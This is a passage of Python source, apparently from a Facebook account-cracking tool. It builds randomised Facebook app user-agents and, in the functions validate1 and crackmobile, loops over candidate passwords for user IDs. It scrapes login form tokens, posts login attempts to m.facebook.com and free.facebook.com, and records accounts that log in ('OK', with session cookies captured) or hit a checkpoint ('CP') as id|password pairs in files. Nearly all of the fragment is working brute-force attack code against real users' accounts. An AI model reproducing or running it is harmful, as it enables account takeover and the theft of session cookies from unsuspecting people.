	elif len(fx) in [9,10]:
		tahunz = '2008'
	elif len(fx)==8:
		tahunz = '2007'
	elif len(fx)==7:
		tahunz = '2006'
	else:tahunz=''
	return tahunz
def usman() :
	rr=random.randint
	a=f'Mozilla/5.0 (iPad; CPU OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36 [FBAN/MessengerForiOS;FBAV/100.1.0.36.68;FBBV/46154306;FBRV/0;FBDV/iPad4,2;FBMD/iPad;FBSN/iPhone OS;FBSV/9.3.5;FBSS/2;FBCR/Viettel;FBID/tablet;FBLC/en_US;FBOP/5]'
	b=f'Dalvik/2.1.0 (Linux; U; Android {str(rr(1,10))}; POCO X3 NFC MIUI/V{str(rr(1,12))}.0.10.0.QJGMIXM) [FBAN/FB4A;FBAV/24.0.0.0.1;FBLC/in_ID;FBBV/5467793;FBCR/XL;FBMF/Xiaomi;FBBD/POCO;FBDV/POCO X3 NFC;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/density=2.75,width=1080,height=2179;FB_FW/1;] FBBK/1'
	c=f'Mozilla/5.0 (Linux; Android {str(rr(2,6))}; POCO X3 NFC Build/QKQ1.200512.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,60))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/23.0.0.0.8;FBBV/5334568;FBDM/density=2.75,width=1080,height=2179;FBLC/id_ID;FBCR/XL;FBMF/Xiaomi;FBBD/POCO;FBPN/com.facebook.katana;FBDV/POCO X3 NFC;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
	d=f'Mozilla/5.0 (Linux; Android {str(rr(1,11))}; RMX1971 Build/RKQ1.201217.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/{str(rr(1,4))}.0 Chrome/{str(rr(10,107))}.0.{str(rr(111,9999))}.{str(rr(10,141))} Mobile Safari/537.36 Maxthon/13400'
	e=f'Mozilla/5.0 (Linux; Android {str(rr(1,10))}; M2007J20CG Build/QKQ1.200512.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/{str(rr(1,4))}.0 Chrome/{str(rr(10,107))}.0.{str(rr(111,9999))}.{str(rr(10,141))} Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/26.0.0.4.133;]'
	g=f'Mozilla/5.0 (Linux; Android {str(rr(1,12))}; ONEPLUS A5000 Build/QKQ1.191014.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/{str(rr(1,4))}.0 Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,200))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(10,394))}.{str(rr(1,10))}.0.{str(rr(10,60))}.{str(rr(10,107))};]'
	h=f'Mozilla/5.0 (Series40; Nokia200/11.64; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/{str(rr(1,5))}.0{str(rr(1,5))}.{str(rr(1,70))}.0{str(rr(1,20))}'
	i=f'Mozilla/5.0 (Linux; Android {str(rr(1,12))}; BAH3-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,110))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36'
	j=f'Mozilla/5.0 (Linux; Android {str(rr(1,12))}; 100003562) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,110))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36'
	k=f'Mozilla/5.0 (Linux; Android {str(rr(1,12))}; iPlay_20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36'
	l=f'Mozilla/5.0 (Linux; Android {str(rr(1,12))}; AGS3-W09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,110))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36'
	m=f'Dalvik/2.1.0 (Linux; U; Android {str(rr(1,6))}.{str(rr(0,5))}; SM-G900F Build/LRX21T) [FBAN/FB4A;FBAV/{str(rr(10,43))}.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-G900F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/density=3.0,width=1080,height=1920;FB_FW/1;]'
	n=f'Dalvik/2.1.0 (Linux; U; Android {str(rr(1,10))}; M2007J20CG MIUI/V{str(rr(1,12))}.0.8.0.QJGMIXM) [FBAN/FB4A;FBAV/{str(rr(10,24))}.0.0.0.1;FBLC/in_ID;FBBV/5467793;FBCR/XL;FBMF/Xiaomi;FBBD/POCO;FBDV/M2007J20CG;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/density=2.75,width=1080,height=2179;FB_FW/1;]'
	raff=random.choice([f'{a}', '{b}', '{c}', '{d}', '{e}', '{f}', '{g}', '{h}', '{i}', '{j}', '{k}', '{l}', '{m}', '{n}']) 
	return raff
def validate1(idf,pwv):
	#bo = random.choice([m,k,h,b,u,x])
	global loop,ok,cp
	#ahir = str(datetime.now()-awal).split('.')[0]
	prog.update(des,description=f'\r⏰{idf}⏰{x} [{loop}-{len(id)}]OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]')
	prog.advance(des)
	ua = random.choice(ugen) 
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1685898230661%26e2e%3D%257B%2522init%2522%253A1685898230661%257D%26ies%3D1%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3Dab5787e4-1930-4a43-b083-079caa897f72%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522d43e9f47-9ed1-45ab-b92a-3597ae93a176%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25227pefkbumdvkfet5cqt6k%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd43e9f47-9ed1-45ab-b92a-3597ae93a176%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522d43e9f47-9ed1-45ab-b92a-3597ae93a176%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25227pefkbumdvkfet5cqt6k%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v12.0/dialog/oauth?cct_prefetching=0&client_id=2036793259884297&cbt=1685898230661&e2e=%7B%22init%22%3A1685898230661%7D&ies=1&sdk=android-12.2.0&sso=chrome_custom_tab&nonce=ab5787e4-1930-4a43-b083-079caa897f72&scope=openid%2Cpublic_profile%2Cuser_friends%2Cemail&state=%7B%220_auth_logger_id%22%3A%22d43e9f47-9ed1-45ab-b92a-3597ae93a176%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%227pefkbumdvkfet5cqt6k%22%7D&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fbconnect%3A%2F%2Fcct.com.dts.freefireth&auth_type=rerequest&response_type=id_token%2Ctoken%2Csigned_request%2Cgraph_domain&return_scopes=true&ret=login&fbapp_pres=0&logger_id=d43e9f47-9ed1-45ab-b92a-3597ae93a176&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1685898230661%26e2e%3D%257B%2522init%2522%253A1685898230661%257D%26ies%3D1%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3Dab5787e4-1930-4a43-b083-079caa897f72%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522d43e9f47-9ed1-45ab-b92a-3597ae93a176%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25227pefkbumdvkfet5cqt6k%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd43e9f47-9ed1-45ab-b92a-3597ae93a176%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522d43e9f47-9ed1-45ab-b92a-3597ae93a176%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25227pefkbumdvkfet5cqt6k%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				cam=f'[•] USER : {idf}\n[•] PWWR : {pw}\n[•] UGEN : {ua}'
				#cam=f'[•] USER : {idf}\n[•] PWWR : {pw}\n[•] UGEN : {ua}'
				ban=nel(tekz(cam,justify='center',style='italic white')) 
				#os.popen('play-audio /sdcard/cp.mp3')
				cetak(nel(ban, width=79, title='[AKUN CP]',style='yellow')) 
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				cam=f'[•] USER : {idf}\n[•] PWWR : {pw}\n[•] COKI : {kuki}'
				#cam=f'[•] USER : {idf}\n[•] PWWR : {pw}\n[•] UGEN : {ua}'
				ban=nel(tekz(cam,justify='center',style='italic green')) 
				#os.popen('play-audio /sdcard/cp.mp3')
				cetak(nel(ban, width=79, title='[AKUN OK]',style='magenta')) 
				#os.popen('play-audio /sdcard/ok.mp3')
				open('OK/'+okh,'a').write(idf+'|'+pw+'\n')
				#cek_apk(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
###----------[  MOBILE ]----------###
def crackmobile(idf,pwv):
	bo = random.choice([m,k,h,b,u,x])
	global loop,ok,cp
	#ahir = str(datetime.now()-awal).split('.')[0]
	prog.update(des,description=f'\r{u}⏰{idf}⏰{x} [{loop}-{len(id)}]OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]')
	prog.advance(des)
	ua = random.choice(ugen) 
	ses = requests.Session()
	for pw in pwv:
		try:
			#ling = random.choice(["https://m.facebook.com/login.php?skip_api_login=1&api_key=140810032656374&kid_directed_site=0&app_id=140810032656374&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fclient_id%3D140810032656374%26redirect_uri%3Dhttps%253A%252F%252Faccounts.pixiv.net%252Fpigya%252Fproxy%252Fcallback%252Ffacebook%26response_type%3Dcode%26scope%3Demail%26state%3DGeDYUodE_pVN5pDXKBbhaF12RvXSU-30ikz4dZVHI8w%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd3e7e4df-8e7b-42c9-81a7-ee0e2abb19c9%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.pixiv.net%2Fpigya%2Fproxy%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DGeDYUodE_pVN5pDXKBbhaF12RvXSU-30ikz4dZVHI8w%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","https://mobile.facebook.com/v2.9/dialog/oauth?app_id=213560439114&cbt=1677182177996&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df11da1fc663793c%26domain%3Dwww.starmakerstudios.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.starmakerstudios.com%252Ff1245028efb5658%26relation%3Dopener&client_id=213560439114&display=touch&domain=www.starmakerstudios.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fwww.starmakerstudios.com%2Flogin%2Fpage%3Freturn_url%3D%2Finstrumental%2Fupload&locale=zh_CN&logger_id=f2bda15588a0498&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1931b4149a3a44%26domain%3Dwww.starmakerstudios.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.starmakerstudios.com%252Ff1245028efb5658%26relation%3Dopener%26frame%3Df3f39a10ef963dc&response_type=token%2Csigned_request%2Cgraph_domain&scope=email&sdk=joey&version=v2.9","https://m.facebook.com/login.php?skip_api_login=1&api_key=213560439114&kid_directed_site=0&app_id=213560439114&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D213560439114%26cbt%3D1677419913361%26e2e%3D%257B%2522init%2522%253A1677419913361%257D%26ies%3D1%26sdk%3Dandroid-14.1.1%26sso%3Dchrome_custom_tab%26nonce%3D063978e3-28aa-4a0f-bbc6-9272a9973fcb%26scope%3Duser_birthday%252Copenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252281b4243d-16d4-4293-aa47-6359abf5abdd%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522lgg1tdnv3jjnt4houtbf%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.starmakerinteractive.starmaker%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DP1LSLToQntEH2uBpWwB7VQimlXskVC9z-rHLt8TMxh0%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D81b4243d-16d4-4293-aa47-6359abf5abdd%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.starmakerinteractive.starmaker%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252281b4243d-16d4-4293-aa47-6359abf5abdd%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522lgg1tdnv3jjnt4houtbf%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","https://d.facebook.com/login.php?skip_api_login=1&api_key=727108917352926&kid_directed_site=0&app_id=727108917352926&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv9.0%2Fdialog%2Foauth%3Fapp_id%3D727108917352926%26cbt%3D1676648129870%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df337b52fd2b1b34%2526domain%253Daccounts.bukalapak.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccounts.bukalapak.com%25252Ff1b32aa613da12%2526relation%253Dopener%26client_id%3D727108917352926%26display%3Dtouch%26domain%3Daccounts.bukalapak.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Faccounts.bukalapak.com%252Flogin%26locale%3Den_US%26logger_id%3Df3935ed85c12938%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df149498fe543d88%2526domain%253Daccounts.bukalapak.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccounts.bukalapak.com%25252Ff1b32aa613da12%2526relation%253Dopener%2526frame%253Df295e1a994048b8%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv9.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df149498fe543d88%26domain%3Daccounts.bukalapak.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Faccounts.bukalapak.com%252Ff1b32aa613da12%26relation%3Dopener%26frame%3Df295e1a994048b8%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr","https://m.facebook.com/login.php?skip_api_login=1&api_key=727108917352926&kid_directed_site=0&app_id=727108917352926&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv9.0%2Fdialog%2Foauth%3Fapp_id%3D727108917352926%26cbt%3D1676648129870%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df337b52fd2b1b34%2526domain%253Daccounts.bukalapak.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccounts.bukalapak.com%25252Ff1b32aa613da12%2526relation%253Dopener%26client_id%3D727108917352926%26display%3Dtouch%26domain%3Daccounts.bukalapak.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Faccounts.bukalapak.com%252Flogin%26locale%3Den_US%26logger_id%3Df3935ed85c12938%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df149498fe543d88%2526domain%253Daccounts.bukalapak.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccounts.bukalapak.com%25252Ff1b32aa613da12%2526relation%253Dopener%2526frame%253Df295e1a994048b8%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv9.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df149498fe543d88%26domain%3Daccounts.bukalapak.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Faccounts.bukalapak.com%252Ff1b32aa613da12%26relation%3Dopener%26frame%3Df295e1a994048b8%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr","https://m.facebook.com/login.php?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D2036793259884297%26redirect_uri%3Dhttps%253A%252F%252Fauth.garena.com%252Foauth%252Flogin%252Ffacebook%26response_type%3Dtoken%26scope%3Dpublic_profile%252Cemail%252Cuser_friends%26state%3Dresponse_type%25253Dtoken%252526locale%25253Dzh-TW%252526redirect_uri%25253Dhttps%2525253A%2525252F%2525252Freward.ff.theextraevent.com%2525252F%252526client_id%25253D100067%252526all_platforms%25253D1%252526platform%25253D3%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D63424a58-d9fb-43d6-8339-9da57677c740%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.garena.com%2Foauth%2Flogin%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dresponse_type%25253Dtoken%252526locale%25253Dzh-TW%252526redirect_uri%25253Dhttps%2525253A%2525252F%2525252Freward.ff.theextraevent.com%2525252F%252526client_id%25253D100067%252526all_platforms%25253D1%252526platform%25253D3%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr","https://m.facebook.com/login.php?skip_api_login=1&api_key=344190606773871&kid_directed_site=0&app_id=344190606773871&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fclient_id%3D344190606773871%26redirect_uri%3Dhttps%253A%252F%252Fauthenticate.riotgames.com%252Fredirects%252Ffacebook%26state%3Dd44688bbac59d9c3de688e814e2ab7ea71490a1acd0c127d0d1afab581e4%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dff099d1e-0102-46d4-9099-0a0e12bb6880%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauthenticate.riotgames.com%2Fredirects%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dd44688bbac59d9c3de688e814e2ab7ea71490a1acd0c127d0d1afab581e4%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr","https://m.facebook.com/login.php?skip_api_login=1&api_key=1036341366506456&kid_directed_site=0&app_id=1036341366506456&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D1036341366506456%26redirect_uri%3Dhttps%253A%252F%252Fwww.pubgmobile.com%252Fact%252Fyoutubeconnect%252Findex.html%26response_type%3Dtoken%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbb725ceb-df23-4dfe-b0b9-a2693a056fbe%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.pubgmobile.com%2Fact%2Fyoutubeconnect%2Findex.html%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr"])
			link = ses.get('https://free.facebook.com/login.php?skip_api_login=1&api_key=290293790992170&kid_directed_site=0&app_id=290293790992170&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D290293790992170%26cbt%3D1684773097456%26e2e%3D%257B%2522init%2522%253A1684773097456%257D%26ies%3D0%26sdk%3Dandroid-android-8.2.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cemail%252Cuser_location%26state%3D%257B%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb290293790992170%253A%252F%252Fauthorize%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dad75f273-5e6b-4e07-b7dd-eab74845964f%26tp%3Dunspecified&cancel_url=fb290293790992170%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			#link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'free.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v8.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-debug': 'RW01gY2TTCMqIdYqyuqmeF1CqLG/4X9gWARBaqVi0LMUgCHNzLdLS+5lvlLnRgplESoVeUHKj4pMGYJWZrDACA==','content-length': '0','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent':'Mozilla/5.0 (Linux; U; Android 8.1.0; 6.0.1; SUWAN-XD Build/MMB29K)AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/98.0.4372.68 MobileSafari/537.36 XiaoMi/MiuiBrowser/10.4.3-g','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': '?1','sec-fetch-dest': 'empty','referer': 